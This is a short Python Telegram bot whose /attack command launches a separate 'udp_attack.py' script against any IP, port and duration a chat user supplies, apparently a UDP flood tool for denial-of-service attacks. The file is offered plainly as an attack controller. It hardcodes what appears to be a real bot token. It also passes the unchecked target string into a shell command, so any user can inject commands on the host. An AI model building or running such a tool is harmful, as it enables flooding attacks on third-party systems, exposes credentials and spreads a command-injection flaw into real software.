from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram import Update
import subprocess

TOKEN = "7230364476:AAEj4oTyDcrlWBe_X0mR5ZccaV3sg0_va4Y"

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Send /attack <IP> <port> <duration> to start an attack.")

def attack(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 3:
        update.message.reply_text("Usage: /attack <IP> <port> <duration>")
        return

    target_ip = context.args[0]
    target_port = int(context.args[1])
    duration = int(context.args[2])

    update.message.reply_text(f"Attacking {target_ip}:{target_port} for {duration} seconds...")

    command = f"python3 udp_attack.py {target_ip} {target_port} {duration}"
    subprocess.Popen(command, shell=True)

def main() -> None:
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("attack", attack))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
